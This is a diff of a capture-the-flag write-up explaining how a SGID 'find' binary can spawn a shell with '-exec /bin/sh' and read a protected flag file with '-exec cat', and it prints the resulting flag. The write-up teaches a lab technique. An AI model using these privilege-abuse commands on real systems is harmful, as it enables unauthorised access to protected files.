@@ -37,7 +37,7 @@ find . -exec /bin/sh \; -quit
 ```
 This will spawn a shell, but because perm is 2000 we don't inherit the groups permissions, so we are still spawning a shell as user. But, we can also pass other commands instead of /bin/sh. Perhaps we can try to read the flag.txt by modifying the command like so:
 ```sh
-find . -exec cat /home/finder/ \; -quit
+find . -exec cat /home/finder/flag.txt \; -quit
 flag{5da1de289823cfc200adf91d6536d914}
 ```
 Success! Read further into SUID and SGID exploitation for more details.
